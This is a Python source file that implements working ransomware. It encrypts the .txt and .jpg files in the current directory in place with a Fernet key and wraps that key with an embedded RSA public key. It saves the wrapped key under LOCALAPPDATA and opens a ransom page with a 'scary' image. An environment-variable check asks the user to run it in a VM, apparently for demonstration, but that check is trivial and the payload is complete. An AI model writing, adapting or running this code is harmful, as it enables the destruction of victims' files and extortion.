import os, base64, sys
from shutil import copy2
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend 
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet
from subprocess import Popen

save_loc="ransomware"

def get_filestr(filestring: str) -> str:
    if getattr(sys, 'frozen', False):
        filestring = os.path.join(sys._MEIPASS, filestring)
    return filestring

def encrypt(plaintext: bytes, key: Fernet) -> None:
    return key.encrypt(plaintext)

def encryption(key: bytes):
    save_key("public_key.pem", key)
    fernet = Fernet(key)
    files = os.listdir()
    for file in files:
        if file.endswith(".txt") or file.endswith(".jpg"):
            with open(file,"rb") as f:
                plaintext = f.read()
            with open(file,"wb") as f:
                f.write(encrypt(plaintext, fernet))

def save_key(keyfile: str, key: bytes, filename = "keyfile"):
    keyfile = get_filestr(keyfile)

    with open(keyfile, "rb") as f:
        public_key = serialization.load_pem_public_key(
            f.read(),
            backend=default_backend()
        )

    encrypted_key = base64.b64encode(public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    ))

    path = get_appdatastr()
    os.mkdir(path)
    dump_files()
    with open(os.path.join(path, filename), "wb") as f:
        f.write(encrypted_key)
    open_webpage(get_appdatastr("gui.html"))

def open_webpage(webpage: str) -> None:
    Popen(["cmd", "/C", "start", webpage])

def get_appdatastr(*string):
    return os.path.join(os.getenv("LOCALAPPDATA"), save_loc, *string)

def dump_files():
    files = ["gui.html", "scary.jpg"]
    for file in files:
        copy2(get_filestr(file), get_appdatastr(file))

if 'RUNNING_ON_VM' not in os.environ:
    print("Please run this exe in a safe environment i.e. \
VM or sandbox and set RUNNING_ON_VM environment variable")
    sys.exit(1)

try: 
    if not os.path.exists(get_appdatastr()): 
        encryption(Fernet.generate_key())

except Exception as e:
    print("Encryption Failed")
    print("Damn Failed Attempt")
    print(e)